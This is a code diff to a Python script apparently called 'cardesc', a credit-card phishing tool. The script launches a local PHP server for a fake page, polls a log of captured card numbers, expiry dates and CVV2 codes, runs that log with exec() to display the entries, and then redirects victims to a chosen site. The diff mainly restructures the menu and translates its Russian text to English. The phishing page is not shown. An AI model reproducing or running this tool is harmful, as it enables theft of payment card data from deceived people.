@@ -1,8 +1,7 @@
 import os, sys, time
-from time import sleep
 from multiprocessing import Process
 from prettytable import PrettyTable
-import os
+from info.data import *
 import json
 import requests
 
@@ -11,13 +10,13 @@ with open("dist/log.log", "w") as dist:
     pass
 
 class A:
-    def __call__(self, count=10, sleep_time=0.5):
+    def __call__(self):
         os.system("cd dist && php -S localhost:"+str(ports))
 class B:
-    def __call__(self, count=10, sleep_time=0.5):
+    def __call__(self):
         while True:
             x = PrettyTable()
-            x.field_names = ['OS', 'number', 'date', 'cvv2']
+            x.field_names = ['os', 'number', 'date', 'cvv2']
             exec(open('dist/log.log').read())
             print(x)
             time.sleep(1)
@@ -36,13 +35,14 @@ def upd():
             if (str(gh_version) > meta['version']):
                 print(logo)
                 print(f'\n[>]New Update Available : {gh_version}')
-                print(' |--> Please install     : https://github.com/oldnum/betarla')
+                print(' |--> Please install     : https://github.com/oldnum/cardesc')
                 print(f'[>]New Update Available : {gh_version}')
                 exit()
             else:
                 pass
     except Exception as exc:
-        pass
+        print(f'Exception : {str(exc)}')
+        exit()
 upd()
 logo=(f"""\n
 ┌─┐┌─┐┬─┐┌┬┐┌─┐┌─┐┌─┐
@@ -52,13 +52,14 @@ logo=(f"""\n
  |--> btc: {meta['donate']['btc']}          
  |--> eth: {meta['donate']['eth']}
 [>] Telegram    : {meta['telegram']}\n""")
+
 print(logo,"""
-[0] История BANK
-[1] CARD PAY
+[0] History Bank
+[1] Card Pay
 [2] Helping
 """)
-used = input("Введите номер: ")
-if (used=='0'):
+used = input("num lock: ")
+if used=='0':
     try:
         os.system('clear || cls')
         print(logo)
@@ -67,12 +68,33 @@ if (used=='0'):
         exit()
     except:
         exit()
-elif (used=='1'):
-    a=A()
-elif (used == '2'):
+
+elif used=='1':
+    try:
+        ports = int(input("ports: "))
+    except:
+        ports=8080
+    reloc = input("redirect or (enter): ")
+    if (reloc == ""):
+        with open("dist/location.location", 'w') as loca:
+            loca.write("https://google.com")
+    else:
+        pass
+    a = A()
+    b = B()
+
+    p1 = Process(target=a)
+    p2 = Process(target=b)
+    p1.start()
+    p2.start()
+
+    p1.join()
+    p2.join()
+elif used == '2':
     upd()
     os.system('clear || cls')
     print(logo)
+    print(info_help)
     print(f"""#  cardesc  v.{meta['version']}
     apt update && apt upgrade
     git clone https://github.com/oldnum/cardesc
@@ -80,38 +102,9 @@ elif (used == '2'):
     pip3 install -r requirements.txt
 
 #  launch
-    python3 bank.py\n""")
+    python3 bank.py\n\nHelping:\n[>] Telegram    : {meta['telegram']}\n""")
     exit()
 else:
     os.system("clear || cls")
     print(logo)
     exit()
-try:
-    ports = int(input("Порт (default 8080): "))
-except:
-    ports=8080
-reloc = input("Редирект or (enter): ")
-
-if reloc != "":
-    if used == "1":
-        with open("dist/location.location", 'w') as loca:
-            loca.write(reloc)
-    else:
-        pass
-else:
-    if used ==  "1":
-        with open("dist/location.location", 'w') as loca:
-            loca.write("https://google.com")
-if (ports == ""):
-    ports=8080
-if __name__ == '__main__':
-    a = A()
-    b = B()
-
-    p1 = Process(target=a, kwargs={'sleep_time': 0.7})
-    p2 = Process(target=b, args=(12,))
-    p1.start()
-    p2.start()
-
-    p1.join()
-    p2.join()
